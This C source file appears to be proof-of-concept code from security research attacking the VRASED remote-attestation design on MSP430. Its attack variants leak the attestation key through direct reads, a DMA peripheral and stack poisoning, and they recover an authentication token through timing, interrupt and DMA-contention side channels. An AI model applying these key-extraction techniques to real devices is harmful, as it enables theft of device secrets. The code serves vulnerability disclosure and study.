#include <string.h>

/**
 * Attack authors: our comments are added as block comments, the original
 * VRASED comments are preserved as line comments.
 * */

/*********** TRUSTED VRASED WRAPPER CODE (inside SW-Att) ***********/

#define MAC_ADDR 0x0230
#define KEY_ADDR 0x6A00
#define ATTEST_DATA_ADDR 0xE000
#define ATTEST_SIZE 0x20

/* Fields for VRASED_A */
#define CTR_ADDR 0x0270
#define VRF_AUTH 0x0250

extern void
hmac(
  uint8_t *mac,
  uint8_t *key,
  uint32_t keylen,
  uint8_t *data,
  uint32_t datalen
);

#if __ATTACK == 4 || __ATTACK == 5 || __ATTACK == 6

/**
 * VRASED_A: authenticated attestation
 * We based the code on the RATA implementation, which only differs from the code
 * in the appendix of VRASED in one place: it uses the MAC region to pass the challenge
 * (which the base VRASED also does).
 * */

__attribute__ ((section (".do_mac.call"))) void Hacl_HMAC_SHA2_256_hmac_entry()
{
  uint8_t key[64] = {0};
  uint8_t verification[32] = {0};

  if (memcmp((uint8_t*) MAC_ADDR, (uint8_t*) CTR_ADDR, 32) > 0)
  {
    memcpy(key, (uint8_t*) KEY_ADDR, 64);
    hmac((uint8_t*) verification, (uint8_t*) key, (uint32_t) 64, (uint8_t*)MAC_ADDR, (uint32_t) 32);

    // Verifier Authentication before calling HMAC
    if (memcmp((uint8_t*) VRF_AUTH, verification, 32) == 0)
    {
      memcpy((uint8_t*) CTR_ADDR, (uint8_t*) MAC_ADDR, 32);

      // Key derivation function for rest of the computation of HMAC
      hmac((uint8_t*) key, (uint8_t*) key, (uint32_t) 64, (uint8_t*) verification, (uint32_t) 32);

      // HMAC on the attestation region. Stores the result in MAC_ADDR itself.
      hmac((uint8_t*) MAC_ADDR, (uint8_t*) key, (uint32_t) 32, (uint8_t*) ATTEST_DATA_ADDR, (uint32_t) ATTEST_SIZE);
    }
  }

  // setting the return addr:
  __asm__ volatile("mov    #0x0300,   r6" "\n\t");
  __asm__ volatile("mov    @(r6),     r6" "\n\t");

  // postamble
  __asm__ volatile("add     #70,    r1" "\n\t");
  __asm__ volatile( "br      #__mac_leave" "\n\t");
}

#else

__attribute__ ((section (".do_mac.call"))) void Hacl_HMAC_SHA2_256_hmac_entry() {

    //Save application stack pointer.
    //Allocate key buffer.
    #if __ATTACK == 3
    /**
     * NOTE: we explicitly remove the (redundant) zero-initialization here, as
     * it may generate an early reset when writing out of the MAC region.
     * However, this is only needed when the compiler does not already optimize
     * away the redundant zero-intialization when noticing the explicit memcpy
     * initialization below (e.g., as validated with clang-msp430; see also the
     * ../../swatt-init directory).
     * */
    uint8_t key[64];
    #else
    uint8_t key[64] = {0};
    #endif

    //Copy the key from KEY_ADDR to the key buffer.
    memcpy(key, (uint8_t*)KEY_ADDR, 64);
    hmac((uint8_t*) key, (uint8_t*) key, (uint32_t) 64, (uint8_t*) MAC_ADDR, (uint32_t) 32);
    // Uses the result in the key buffer to compute HMAC.
    // Stores the result in HMAC ADDR.
    hmac((uint8_t*) (MAC_ADDR), (uint8_t*) key, (uint32_t) 32, (uint8_t*) ATTEST_DATA_ADDR, (uint32_t) ATTEST_SIZE);

	//return;

    // setting the return addr:
    __asm__ volatile("mov    #0x0300,   r6" "\n\t");
    __asm__ volatile("mov    @(r6),     r6" "\n\t");

    // postamble
    __asm__ volatile("add     #70,    r1" "\n\t");
    __asm__ volatile( "br      #__mac_leave" "\n\t");
}

#endif

__attribute__ ((section (".do_mac.leave"))) __attribute__((naked)) void Hacl_HMAC_SHA2_256_hmac_exit() {
    __asm__ volatile("br   r6" "\n\t");
}

/*********** UNTRUSTED VRASED WRAPPER CODE (outside SW-Att) ***********/

#include <stdio.h>
#include "hardware.h"

#define DMA_ATTACKER_STEAL_KEY          0x0070
#define DMA_ATTACKER_PERSISTENT_FLAG    0x0072
#define DMA_ATTACKER_RESET_CNT          0x0074
#define DMA_ATTACKER_COUNTDOWN          0x0076
#define DMA_ATTACKER_DELAYED            0x0078

#define KEY_SIZE                        64

/**
 * MAC region: [0x0230, 0x250[
 * NOTE: leave 12 bytes for local variables of memcpy function
 * */
#define STACK_POISON_ADDRESS            (MAC_ADDR + KEY_SIZE + 12)

/* stringify macro parameter a */
#define __s__(a)                        #a
#define _s_(a)                          __s__(a)

void my_memset(uint8_t* ptr, int len, uint8_t val) {
  int i=0;
  for(i=0; i<len; i++) ptr[i] = val;
}

void my_memcpy(uint8_t* dst, uint8_t* src, int size) {
  int i=0;
  for(i=0; i<size; i++) dst[i] = src[i];
}

void dump_buf(char *name, uint8_t *buf, int start, int end)
{
    printf("%s[%d:%d]: ", name, start, end-1);

    for (int i = start; i < end; i++)
        printf("%02x", *(buf+i));
    printf("\n");
}

int have_reset = 0;

/**
 * Demonstrate how VRASED attackers with arbitrary untrusted code execution can
 * detect and persist state across resets (as used in some of the attacks below).
 *
 * NOTE: the approach below uses a simple .noinit global variable, which, once
 * initialized to a known magic value, will survive across resets (i.e., it
 * will not be zeroed by the reset vector code; its value is unspecified in
 * real RAM and will very likely not be exactly the magic marker 0xdead).
 *
 * Alternatively, when the attacker controls a custom DMA peripheral, a reset
 * can also be detected by polling the `DMA_ATTACKER_PERSISTENT_FLAG` adress of
 * our custom DMA attacker peripheral.
 */
int __attribute__ ((section (".noinit"))) reset_marker;
int __attribute__ ((section (".noinit"))) attack_iteration;

void VRASED (uint8_t *challenge, uint8_t *response) {
    if (reset_marker == 0xdead)
        have_reset = 1;
    else {
        reset_marker = 0xdead;
        attack_iteration = 0;
    }

    printf("Attack: %d; have_reset: %d\n", __ATTACK, have_reset);

    #if __ATTACK == 1
      dump_buf("leak", (uint8_t*) KEY_ADDR, 31, 64);
      return;
    #endif

    #if __ATTACK == 2
      __asm__ volatile(
          "mov #1, &" _s_(DMA_ATTACKER_STEAL_KEY) "\n"
          ".REPT 64 \n"
          "  nop \n"
          ".ENDR \n"
      );
      dump_buf("leak", (uint8_t*) MAC_ADDR, 0, 64);
      return;
    #endif

    #if __ATTACK == 3
      if (have_reset) {
        dump_buf("leak", (uint8_t*) (STACK_POISON_ADDRESS - 64), 0, 22);
        return;
      } else {
        printf("First run\n");
      }
    #endif

    #if __ATTACK == 4 || __ATTACK == 5 || __ATTACK == 6
      if (!have_reset)
        dump_buf("ctr", (uint8_t*) CTR_ADDR, 0, 32);

      my_memset((uint8_t*) VRF_AUTH, 32, 0);
      uint8_t * verification = (uint8_t*) VRF_AUTH;

      /* NOTE: Brute-forcing the entire verification token is possible in
       * linear time, but will still take long in the iverilog simulation.
       * Hence, our PoC only demonstrates timing leakage for the first two
       * bytes with demonstration guesses chosen as follows.
       *
       * Correct verification token is:
       * 444eb44a4a018344b057451667ac6e8414f7736c329edd7fff8d467cb1f5c5d3
       */
    attack4:
      switch (attack_iteration) {
      case 0:
        verification[0] = 0x42;
        verification[1] = 0x42;
        break;
      case 1:
        verification[0] = 0x44;
        verification[1] = 0x42;
        break;
      case 2:
        verification[0] = 0x44;
        verification[1] = 0x4e;
        break;
      }
      attack_iteration++;
    #endif

    #if __ATTACK == 4
      /* setting up the clock for time measurement */
      TACTL = TACLR | MC_2 | TASSEL_2;
    #endif

    #if __ATTACK == 5
      if (have_reset) {
        uint16_t delay = *((uint16_t*) DMA_ATTACKER_RESET_CNT);
        printf("Interrupt delay: %u\n", delay);

        /**
         * In case the delay is 14486, it means the interrupt was served in one
         * cycle: it hit the `mov.b` instruction (pc: b0b6) that is already
         * outside of the comparison loop in `memcmp`.
         * In case the delay is one cycle longer, that indicates interrupting
         * during the `jmp` instruction (pc: b0be) that jumps back to the start
         * of the comparison loop in `memcmp`, indicating that the first byte
         * was correctly guessed.
         * */
        if (delay == 14486) {
          printf("First byte not guessed, retrying\n");
        } else {
          printf("First byte guessed, finishing\n");
          return;
        }
      } else {
        printf("First run\n");
      }

      /* setting up the clock for interrupting */
      TACCR0 = 26385;
      *((uint16_t*) DMA_ATTACKER_RESET_CNT) = 0;
      TACTL = TACLR | MC_1 | TASSEL_2 | ID_3 | TAIE;
    #endif

    #if __ATTACK == 6
      if (have_reset) {
        uint16_t delayed = *((uint16_t*) DMA_ATTACKER_DELAYED);
        printf("DMA delayed: %s\n", delayed ? "Yes" : "No");

        /**
         * Similar to above, we aim the DMA data memory request to the same
         * cycle when the `memcmp` loads the byte to be compared from data
         * memory.
         * If the contention happens, that means the next byte was fetched,
         * indicating that the comparison for the current byte succeeded, the
         * guessed value was correct.
         * */
        if (!delayed) {
          printf("First byte not guessed, retrying\n");
        } else {
          printf("First byte guessed, finishing\n");
          return;
        }
      } else {
        printf("First run\n");
      }

      /* setting up the timed dma request */
      *((uint16_t*) DMA_ATTACKER_COUNTDOWN) = 26387;
      __asm__ volatile("nop\n"); /* skipping one cycle for precise timing */
    #endif

    //Copy input challenge to MAC_ADDR:
    my_memcpy ( (uint8_t*)MAC_ADDR, challenge, 32);

    #if __ATTACK == 5
    /* enable interrupts */
    __eint();
    #else
    //Disable interrupts:
    __dint();
    #endif

    // Save current value of r5 and r6:
    __asm__ volatile("push    r5" "\n\t");
    __asm__ volatile("push    r6" "\n\t");

    // Write return address of Hacl_HMAC_SHA2_256_hmac_entry
    // to RAM:
    __asm__ volatile("mov    #0x000e,   r6" "\n\t");
    __asm__ volatile("mov    #0x0300,   r5" "\n\t");
    __asm__ volatile("mov    r0,        @(r5)" "\n\t");
    __asm__ volatile("add    r6,        @(r5)" "\n\t");

    // Save the original value of the Stack Pointer (R1):
    __asm__ volatile("mov    r1,    r5" "\n\t");

    // Set the stack pointer to the base of the exclusive stack:
    #if __ATTACK == 3
      /* NOTE: call will do a 2-byte push, hence desired address + 2 */
      __asm__ volatile("mov #" _s_(STACK_POISON_ADDRESS + 2) ",     r1" "\n\t");
    #else
      __asm__ volatile("mov    #0x1002,     r1" "\n\t");
    #endif

    // Call SW-Att:
    Hacl_HMAC_SHA2_256_hmac_entry();

    // Copy retrieve the original stack pointer value:
    __asm__ volatile("mov    r5,    r1" "\n\t");

    // Restore original r5,r6 values:
    __asm__ volatile("pop   r6" "\n\t");
    __asm__ volatile("pop   r5" "\n\t");

    // Enable interrupts:
    __eint();

    #if __ATTACK == 4
      uint16_t tar = TAR;
      printf("Attack iteration %d, execution took %d cycles (%d bytes correct)\n",
        attack_iteration,
        tar,
        (tar - 14511) / 13); /* Cycle count: 14511 + (guessed_byte_count * 13) */
      if (attack_iteration <= 2) {
        goto attack4;
      }
    #endif

    // Return the HMAC value to the application:
    my_memcpy(response, (uint8_t*)MAC_ADDR, 32);
}
